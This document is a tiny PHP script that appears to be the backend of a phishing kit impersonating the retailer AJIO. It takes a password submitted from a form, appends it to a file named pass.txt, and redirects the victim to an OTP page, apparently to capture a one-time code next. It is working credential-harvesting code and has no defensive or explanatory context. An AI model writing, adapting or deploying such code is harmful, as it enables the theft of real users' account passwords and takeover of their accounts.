<?php
file_put_contents("pass.txt", "AJIO Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
